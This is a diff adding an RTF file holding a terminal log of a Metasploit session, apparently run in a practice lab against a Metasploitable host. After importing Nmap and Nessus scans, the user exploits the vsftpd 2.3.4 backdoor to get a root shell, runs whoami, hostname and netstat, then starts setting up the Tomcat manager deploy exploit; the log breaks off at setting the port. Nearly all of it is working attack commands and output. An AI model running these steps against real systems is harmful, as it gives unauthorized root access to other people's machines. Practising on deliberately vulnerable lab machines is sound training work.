@@ -1,0 +1,355 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1504
+{\fonttbl\f0\fswiss\fcharset0 Helvetica;}
+{\colortbl;\red255\green255\blue255;}
+{\*\expandedcolortbl;\csgray\c100000;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww28600\viewh14960\viewkind0
+\pard\tx566\tx1133\tx1700\tx2267\tx2834\tx3401\tx3968\tx4535\tx5102\tx5669\tx6236\tx6803\pardirnatural\partightenfactor0
+
+\f0\fs24 \cf0 root@atacante:~# msf\
+bash: msf: no se encontr\'f3 la orden\
+root@atacante:~# msfconsole\
+                                                  \
+                          ########                  #\
+                      #################            #\
+                   ######################         #\
+                  #########################      #\
+                ############################\
+               ##############################\
+               ###############################\
+              ###############################\
+              ##############################\
+                              #    ########   #\
+                 ##        ###        ####   ##\
+                                      ###   ###\
+                                    ####   ###\
+               ####          ##########   ####\
+               #######################   ####\
+                 ####################   ####\
+                  ##################  ####\
+                    ############      ##\
+                       ########        ###\
+                      #########        #####\
+                    ############      ######\
+                   ########      #########\
+                     #####       ########\
+                       ###       #########\
+                      ######    ############\
+                     #######################\
+                     #   #   ###  #   #   ##\
+                     ########################\
+                      ##     ##   ##     ##\
+                            http://metasploit.com\
+\
+\
+       =[ metasploit v4.12.20-dev                         ]\
++ -- --=[ 1573 exploits - 906 auxiliary - 270 post        ]\
++ -- --=[ 455 payloads - 39 encoders - 8 nops             ]\
++ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]\
+\
+msf > base\
+[-] Unknown command: base.\
+msf > clear\
+[*] exec: clear\
+\
+[3;J\
+msf > db_status\
+[*] postgresql connected to msf3\
+msf > db_import /root/nmap.bck.xml\
+[*] Importing 'Nmap XML' data\
+[*] Import: Parsing with 'Nokogiri v1.6.8'\
+[*] Importing host 198.51.100.222\
+[*] Successfully imported /root/nmap.bck.xml\
+msf > db_status\
+[*] postgresql connected to msf3\
+msf > db_import /root/nessus_report_Escaneo_Metasploit.nessus\
+[*] Importing 'Nessus XML (v2)' data\
+[*] Importing host 198.51.100.222\
+[*] Successfully imported /root/nessus_report_Escaneo_Metasploit.nessus\
+msf > search vsftpd\
+\
+Matching Modules\
+================\
+\
+   Name                                  Disclosure Date  Rank       Description\
+   ----                                  ---------------  ----       -----------\
+   exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  VSFTPD v2.3.4 Backdoor Command Execution\
+\
+\
+msf > use exploit/unix/ftp/vsftpd_234_backdoor \
+msf exploit(vsftpd_234_backdoor) > info\
+\
+       Name: VSFTPD v2.3.4 Backdoor Command Execution\
+     Module: exploit/unix/ftp/vsftpd_234_backdoor\
+   Platform: Unix\
+ Privileged: Yes\
+    License: Metasploit Framework License (BSD)\
+       Rank: Excellent\
+  Disclosed: 2011-07-03\
+\
+Provided by:\
+  hdm <x@hdm.io>\
+  MC <mc@metasploit.com>\
+\
+Available targets:\
+  Id  Name\
+  --  ----\
+  0   Automatic\
+\
+Basic options:\
+  Name   Current Setting  Required  Description\
+  ----   ---------------  --------  -----------\
+  RHOST                   yes       The target address\
+  RPORT  21               yes       The target port\
+\
+Payload information:\
+  Space: 2000\
+  Avoid: 0 characters\
+\
+Description:\
+  This module exploits a malicious backdoor that was added to the \
+  VSFTPD download archive. This backdoor was introduced into the \
+  vsftpd-2.3.4.tar.gz archive between June 30th 2011 and July 1st 2011 \
+  according to the most recent information available. This backdoor \
+  was removed on July 3rd 2011.\
+\
+References:\
+  http://www.osvdb.org/73573\
+  http://pastebin.com/AetT9sS5\
+  http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html\
+\
+msf exploit(vsftpd_234_backdoor) > show option\
+[-] Invalid parameter "option", use "show -h" for more information\
+msf exploit(vsftpd_234_backdoor) > show options\
+\
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):\
+\
+   Name   Current Setting  Required  Description\
+   ----   ---------------  --------  -----------\
+   RHOST                   yes       The target address\
+   RPORT  21               yes       The target port\
+\
+\
+Exploit target:\
+\
+   Id  Name\
+   --  ----\
+   0   Automatic\
+\
+\
+msf exploit(vsftpd_234_backdoor) > set RHOST 198.51.100.222\
+RHOST => 198.51.100.222\
+msf exploit(vsftpd_234_backdoor) > show payloads\
+\
+Compatible Payloads\
+===================\
+\
+   Name               Disclosure Date  Rank    Description\
+   ----               ---------------  ----    -----------\
+   cmd/unix/interact                   normal  Unix Command, Interact with Established Connection\
+\
+msf exploit(vsftpd_234_backdoor) > set PAYLOAD cmd/unix/interact \
+PAYLOAD => cmd/unix/interact\
+msf exploit(vsftpd_234_backdoor) > show options\
+\
+Module options (exploit/unix/ftp/vsftpd_234_backdoor):\
+\
+   Name   Current Setting  Required  Description\
+   ----   ---------------  --------  -----------\
+   RHOST  198.51.100.222   yes       The target address\
+   RPORT  21               yes       The target port\
+\
+\
+Payload options (cmd/unix/interact):\
+\
+   Name  Current Setting  Required  Description\
+   ----  ---------------  --------  -----------\
+\
+\
+Exploit target:\
+\
+   Id  Name\
+   --  ----\
+   0   Automatic\
+\
+\
+msf exploit(vsftpd_234_backdoor) > exploit\
+\
+[*] 198.51.100.222:21 - Banner: 220 (vsFTPd 2.3.4)\
+[*] 198.51.100.222:21 - USER: 331 Please specify the password.\
+[+] 198.51.100.222:21 - Backdoor service has been spawned, handling...\
+[+] 198.51.100.222:21 - UID: uid=0(root) gid=0(root)\
+[*] Found shell.\
+[*] Command shell session 1 opened (198.51.100.111:55214 -> 198.51.100.222:6200) at 2016-10-20 09:55:08 +0200\
+\
+whoami\
+root\
+hostname\
+metasploitable\
+echo I'M GOD.\
+\
+ls\
+^C\
+Abort session 1? [y/N]  N\
+root\
+metasploitable\
+ls\
+^C\
+Abort session 1? [y/N]  y\
+\
+[*] 198.51.100.222 - Command shell session 1 closed.  Reason: User exit\
+msf exploit(vsftpd_234_backdoor) > exploit\
+\
+[*] 198.51.100.222:21 - Banner: 220 (vsFTPd 2.3.4)\
+[*] 198.51.100.222:21 - USER: 331 Please specify the password.\
+[+] 198.51.100.222:21 - Backdoor service has been spawned, handling...\
+[+] 198.51.100.222:21 - UID: uid=0(root) gid=0(root)\
+[*] Found shell.\
+[*] Command shell session 2 opened (198.51.100.111:56543 -> 198.51.100.222:6200) at 2016-10-20 09:56:56 +0200\
+\
+netstat -atpn\
+Active Internet connections (servers and established)\
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name\
+tcp        0      0 0.0.0.0:512             0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 0.0.0.0:513             0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 0.0.0.0:2049            0.0.0.0:*               LISTEN      -               \
+tcp        0      0 0.0.0.0:514             0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 0.0.0.0:37573           0.0.0.0:*               LISTEN      4363/rmiregistry\
+tcp        0      0 0.0.0.0:8009            0.0.0.0:*               LISTEN      4322/jsvc       \
+tcp        0      0 0.0.0.0:6697            0.0.0.0:*               LISTEN      4376/unrealircd \
+tcp        0      0 0.0.0.0:34889           0.0.0.0:*               LISTEN      3426/rpc.statd  \
+tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN      3937/mysqld     \
+tcp        0      0 0.0.0.0:1099            0.0.0.0:*               LISTEN      4363/rmiregistry\
+tcp        0      0 0.0.0.0:6667            0.0.0.0:*               LISTEN      4376/unrealircd \
+tcp        0      0 0.0.0.0:139             0.0.0.0:*               LISTEN      4191/smbd       \
+tcp        0      0 0.0.0.0:5900            0.0.0.0:*               LISTEN      4381/Xtightvnc  \
+tcp        0      0 0.0.0.0:111             0.0.0.0:*               LISTEN      3408/portmap    \
+tcp        0      0 0.0.0.0:8080            0.0.0.0:*               LISTEN      4322/jsvc       \
+tcp        0      0 0.0.0.0:6000            0.0.0.0:*               LISTEN      4381/Xtightvnc  \
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      4342/apache2    \
+tcp        0      0 0.0.0.0:58673           0.0.0.0:*               LISTEN      -               \
+tcp        0      0 0.0.0.0:8787            0.0.0.0:*               LISTEN      4367/ruby       \
+tcp        0      0 0.0.0.0:1524            0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 0.0.0.0:21              0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 198.51.100.222:53       0.0.0.0:*               LISTEN      3790/named      \
+tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      3790/named      \
+tcp        0      0 0.0.0.0:23              0.0.0.0:*               LISTEN      4223/xinetd     \
+tcp        0      0 0.0.0.0:6200            0.0.0.0:*               LISTEN      4673/sh         \
+tcp        0      0 0.0.0.0:5432            0.0.0.0:*               LISTEN      4018/postgres   \
+tcp        0      0 0.0.0.0:25              0.0.0.0:*               LISTEN      4181/master     \
+tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      3790/named      \
+tcp        0      0 0.0.0.0:44956           0.0.0.0:*               LISTEN      4113/rpc.mountd \
+tcp        0      0 0.0.0.0:445             0.0.0.0:*               LISTEN      4191/smbd       \
+tcp        0   2048 198.51.100.222:6200     198.51.100.111:56543    ESTABLISHED 4673/sh         \
+tcp        1      0 198.51.100.222:21       198.51.100.111:53426    CLOSE_WAIT  4674/vsftpd     \
+tcp6       0      0 :::2121                 :::*                    LISTEN      4260/proftpd: (acce\
+tcp6       0      0 :::3632                 :::*                    LISTEN      4045/distccd    \
+tcp6       0      0 :::53                   :::*                    LISTEN      3790/named      \
+tcp6       0      0 :::22                   :::*                    LISTEN      3814/sshd       \
+tcp6       0      0 :::5432                 :::*                    LISTEN      4018/postgres   \
+tcp6       0      0 ::1:953                 :::*                    LISTEN      3790/named      \
+\
+\
+\
+\
+\
+^C\
+Abort session 2? [y/N]  y\
+\
+[*] 198.51.100.222 - Command shell session 2 closed.  Reason: User exit\
+msf exploit(vsftpd_234_backdoor) > back\
+msf > clear\
+[*] exec: clear\
+\
+[3;J\
+msf > \
+msf > use exploit/multi/\
+Display all 231 possibilities? (y or n)\
+msf > use exploit/multi/http/tomcat_mgr_deploy \
+msf exploit(tomcat_mgr_deploy) > info\
+\
+       Name: Apache Tomcat Manager Application Deployer Authenticated Code Execution\
+     Module: exploit/multi/http/tomcat_mgr_deploy\
+   Platform: Java, Linux, Windows\
+ Privileged: No\
+    License: Metasploit Framework License (BSD)\
+       Rank: Excellent\
+  Disclosed: 2009-11-09\
+\
+Provided by:\
+  jduck <jduck@metasploit.com>\
+\
+Available targets:\
+  Id  Name\
+  --  ----\
+  0   Automatic\
+  1   Java Universal\
+  2   Windows Universal\
+  3   Linux x86\
+\
+Basic options:\
+  Name      Current Setting  Required  Description\
+  ----      ---------------  --------  -----------\
+  PASSWORD                   no        The password for the specified username\
+  PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)\
+  Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]\
+  RHOST                      yes       The target address\
+  RPORT     80               yes       The target port\
+  SSL       false            no        Negotiate SSL/TLS for outgoing connections\
+  USERNAME                   no        The username to authenticate as\
+  VHOST                      no        HTTP server virtual host\
+\
+Payload information:\
+\
+Description:\
+  This module can be used to execute a payload on Apache Tomcat \
+  servers that have an exposed "manager" application. The payload is \
+  uploaded as a WAR archive containing a jsp application using a PUT \
+  request. The manager application can also be abused using \
+  /manager/html/upload, but that method is not implemented in this \
+  module. NOTE: The compatible payload sets vary based on the selected \
+  target. For example, you must select the Windows target to use \
+  native Windows payloads.\
+\
+References:\
+  http://cvedetails.com/cve/2009-3843/\
+  http://www.osvdb.org/60317\
+  http://cvedetails.com/cve/2009-4189/\
+  http://www.osvdb.org/60670\
+  http://cvedetails.com/cve/2009-4188/\
+  http://www.securityfocus.com/bid/38084\
+  http://cvedetails.com/cve/2010-0557/\
+  http://www-01.ibm.com/support/docview.wss?uid=swg21419179\
+  http://cvedetails.com/cve/2010-4094/\
+  http://www.zerodayinitiative.com/advisories/ZDI-10-214\
+  http://cvedetails.com/cve/2009-3548/\
+  http://www.osvdb.org/60176\
+  http://www.securityfocus.com/bid/36954\
+  http://tomcat.apache.org/tomcat-5.5-doc/manager-howto.html\
+\
+msf exploit(tomcat_mgr_deploy) > show options\
+\
+Module options (exploit/multi/http/tomcat_mgr_deploy):\
+\
+   Name      Current Setting  Required  Description\
+   ----      ---------------  --------  -----------\
+   PASSWORD                   no        The password for the specified username\
+   PATH      /manager         yes       The URI path of the manager app (/deploy and /undeploy will be used)\
+   Proxies                    no        A proxy chain of format type:host:port[,type:host:port][...]\
+   RHOST                      yes       The target address\
+   RPORT     80               yes       The target port\
+   SSL       false            no        Negotiate SSL/TLS for outgoing connections\
+   USERNAME                   no        The username to authenticate as\
+   VHOST                      no        HTTP server virtual host\
+\
+\
+Exploit target:\
+\
+   Id  Name\
+   --  ----\
+   0   Automatic\
+\
+\
+msf exploit(tomcat_mgr_deploy) > set RHOST 198.51.100.222\
+RHOST => 198.51.100.222\
+msf exploit(tomcat_mgr_deploy) > set RPORT 8080\
+}
